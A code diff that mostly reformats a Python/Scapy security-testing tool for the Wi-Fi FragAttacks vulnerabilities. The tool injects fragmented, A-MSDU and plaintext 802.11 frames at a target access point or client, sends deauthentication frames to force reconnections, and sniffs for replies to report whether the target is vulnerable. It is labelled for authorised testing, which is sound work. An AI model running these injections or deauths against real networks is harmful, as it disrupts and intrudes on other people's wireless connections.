@@ -22,25 +22,22 @@ based FragAttacks tool by Mathy Vanhoef.
 For authorized security testing and research only.
 """
 
-import sys
-import os
 import argparse
 import json
+import os
+import sys
 import threading
 import time
 from datetime import datetime
 from typing import Optional
 
-from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11QoS, RadioTap
-from scapy.layers.eap import EAPOL
-from scapy.layers.l2 import LLC, SNAP, Ether
-from scapy.layers.inet import IP, ICMP
-from scapy.sendrecv import sniff, sendp
+from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11QoS
+from scapy.layers.inet import ICMP
+from scapy.layers.l2 import LLC, SNAP
 from scapy.packet import Raw
-from scapy.utils import wrpcap
+from scapy.sendrecv import sendp, sniff
 
-from utils import validate_mac, validate_interface, setup_logging, require_root
-
+from utils import require_root, setup_logging, validate_interface, validate_mac
 
 # Supported FragAttacks test modes
 TEST_MODES = ("aggregation", "mixed-key", "cache", "plaintext", "all")
@@ -68,12 +65,16 @@ class FragAttacks:
         "plaintext": "_test_plaintext_injection",
     }
 
-    def __init__(self, interface: str, target_bssid: str,
-                 target_client: Optional[str] = None,
-                 channel: Optional[int] = None,
-                 timeout: int = 120,
-                 output_dir: str = "captures",
-                 test_mode: str = "aggregation") -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_bssid: str,
+        target_client: Optional[str] = None,
+        channel: Optional[int] = None,
+        timeout: int = 120,
+        output_dir: str = "captures",
+        test_mode: str = "aggregation",
+    ) -> None:
         self.interface: str = interface
         self.target_bssid: str = target_bssid
         self.target_client: Optional[str] = target_client
@@ -143,8 +144,7 @@ class FragAttacks:
         if fragment_size <= 0:
             raise ValueError("fragment_size must be a positive integer")
 
-        chunks = [payload[i:i + fragment_size]
-                  for i in range(0, len(payload), fragment_size)]
+        chunks = [payload[i : i + fragment_size] for i in range(0, len(payload), fragment_size)]
         if not chunks:
             chunks = [b""]
 
@@ -154,15 +154,13 @@ class FragAttacks:
         total = len(chunks)
         fragments = []
         for idx, chunk in enumerate(chunks):
-            frag = (
-                Dot11(
-                    type=2, subtype=0,
-                    addr1=self.target_client or self.target_bssid,
-                    addr2=self.target_bssid,
-                    addr3=self.target_bssid,
-                )
-                / Raw(load=chunk)
-            )
+            frag = Dot11(
+                type=2,
+                subtype=0,
+                addr1=self.target_client or self.target_bssid,
+                addr2=self.target_bssid,
+                addr3=self.target_bssid,
+            ) / Raw(load=chunk)
             # Start from a known-good integer baseline before manipulating
             # bitfields, since freshly constructed/mocked packets may not
             # expose an existing integer SC/FCfield value.
@@ -272,8 +270,7 @@ class FragAttacks:
         with self._lock:
             before = len(self.responses)
         try:
-            sniff(iface=self.interface, prn=self.packet_handler,
-                  timeout=duration, store=0)
+            sniff(iface=self.interface, prn=self.packet_handler, timeout=duration, store=0)
         except Exception as e:
             self.logger.error("Sniff error: %s", e)
         with self._lock:
@@ -294,8 +291,11 @@ class FragAttacks:
 
         frame = (
             Dot11(
-                type=2, subtype=8,
-                addr1=dst, addr2=self.target_bssid, addr3=self.target_bssid,
+                type=2,
+                subtype=8,
+                addr1=dst,
+                addr2=self.target_bssid,
+                addr3=self.target_bssid,
             )
             / Dot11QoS()
             / Raw(load=amsdu_payload)
@@ -313,8 +313,8 @@ class FragAttacks:
             "vulnerable": vulnerable,
             "details": (
                 "Target appears to accept unauthenticated A-MSDU frames"
-                if vulnerable else
-                "No observable response to unauthenticated A-MSDU frame"
+                if vulnerable
+                else "No observable response to unauthenticated A-MSDU frame"
             ),
         }
 
@@ -330,14 +330,11 @@ class FragAttacks:
 
             # Trigger a rekey/handshake renegotiation window by forcing a
             # deauth (many implementations renegotiate PTK on reassociation).
-            deauth = (
-                Dot11(
-                    addr1=self.target_client or "ff:ff:ff:ff:ff:ff",
-                    addr2=self.target_bssid,
-                    addr3=self.target_bssid,
-                )
-                / Dot11Deauth(reason=1)
-            )
+            deauth = Dot11(
+                addr1=self.target_client or "ff:ff:ff:ff:ff:ff",
+                addr2=self.target_bssid,
+                addr3=self.target_bssid,
+            ) / Dot11Deauth(reason=1)
             sendp(deauth, iface=self.interface, verbose=False)
             time.sleep(1)
 
@@ -353,8 +350,8 @@ class FragAttacks:
             "vulnerable": vulnerable,
             "details": (
                 "Fragment appears to have been reassembled across a key change"
-                if vulnerable else
-                "No observable evidence of cross-key fragment reassembly"
+                if vulnerable
+                else "No observable evidence of cross-key fragment reassembly"
             ),
         }
 
@@ -369,14 +366,11 @@ class FragAttacks:
                 sendp(fragments[0], iface=self.interface, verbose=False)
 
             # Disconnect the client
-            deauth = (
-                Dot11(
-                    addr1=self.target_client or "ff:ff:ff:ff:ff:ff",
-                    addr2=self.target_bssid,
-                    addr3=self.target_bssid,
-                )
-                / Dot11Deauth(reason=7)
-            )
+            deauth = Dot11(
+                addr1=self.target_client or "ff:ff:ff:ff:ff:ff",
+                addr2=self.target_bssid,
+                addr3=self.target_bssid,
+            ) / Dot11Deauth(reason=7)
             sendp(deauth, iface=self.interface, verbose=False)
             time.sleep(2)
 
@@ -393,8 +387,8 @@ class FragAttacks:
             "vulnerable": vulnerable,
             "details": (
                 "Fragment cache was not cleared on reconnection"
-                if vulnerable else
-                "No observable evidence of stale fragment cache use"
+                if vulnerable
+                else "No observable evidence of stale fragment cache use"
             ),
         }
 
@@ -405,8 +399,11 @@ class FragAttacks:
 
         frame = (
             Dot11(
-                type=2, subtype=0,
-                addr1=dst, addr2=self.target_bssid, addr3=self.target_bssid,
+                type=2,
+                subtype=0,
+                addr1=dst,
+                addr2=self.target_bssid,
+                addr3=self.target_bssid,
             )
             / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
             / SNAP(OUI=0, code=0x0800)
@@ -425,8 +422,8 @@ class FragAttacks:
             "vulnerable": vulnerable,
             "details": (
                 "Target accepted plaintext data frame during handshake window"
-                if vulnerable else
-                "No observable response to plaintext frame injection"
+                if vulnerable
+                else "No observable response to plaintext frame injection"
             ),
         }
 
@@ -468,10 +465,12 @@ class FragAttacks:
                 self.results["tests"].append(result)
             except Exception as e:
                 self.logger.error("Test %s failed: %s", mode, e)
-                self.results["tests"].append({
-                    "test": mode,
-                    "error": str(e),
-                })
+                self.results["tests"].append(
+                    {
+                        "test": mode,
+                        "error": str(e),
+                    }
+                )
 
         self.results["end_time"] = datetime.now().isoformat()
         self._running = False
@@ -521,37 +520,54 @@ def main() -> None:
         )
     )
     parser.add_argument(
-        "-i", "--interface", required=True,
+        "-i",
+        "--interface",
+        required=True,
         help="Wireless interface in monitor mode",
     )
     parser.add_argument(
-        "-b", "--bssid", required=True,
+        "-b",
+        "--bssid",
+        required=True,
         help="Target AP BSSID",
     )
     parser.add_argument(
-        "-c", "--client", default=None,
+        "-c",
+        "--client",
+        default=None,
         help="Target client MAC address",
     )
     parser.add_argument(
-        "-ch", "--channel", type=int, default=None,
+        "-ch",
+        "--channel",
+        type=int,
+        default=None,
         help="WiFi channel number",
     )
     parser.add_argument(
-        "-t", "--timeout", type=int, default=120,
+        "-t",
+        "--timeout",
+        type=int,
+        default=120,
         help="Test timeout in seconds (default: 120)",
     )
     parser.add_argument(
-        "-m", "--mode",
+        "-m",
+        "--mode",
         choices=list(TEST_MODES),
         default="aggregation",
         help="Test mode (default: aggregation)",
     )
     parser.add_argument(
-        "-o", "--output-dir", default="captures",
+        "-o",
+        "--output-dir",
+        default="captures",
         help="Output directory for results (default: captures)",
     )
     parser.add_argument(
-        "-v", "--verbose", action="store_true",
+        "-v",
+        "--verbose",
+        action="store_true",
         help="Enable verbose logging",
     )
 
@@ -589,8 +605,7 @@ def main() -> None:
     # Print summary
     for test_result in results.get("tests", []):
         status = "VULNERABLE" if test_result.get("vulnerable") else "Not vulnerable"
-        print(f"[{status}] {test_result.get('test', 'unknown')}: "
-              f"{test_result.get('details', '')}")
+        print(f"[{status}] {test_result.get('test', 'unknown')}: {test_result.get('details', '')}")
 
     if saved_path:
         print(f"\nResults saved to: {saved_path}")
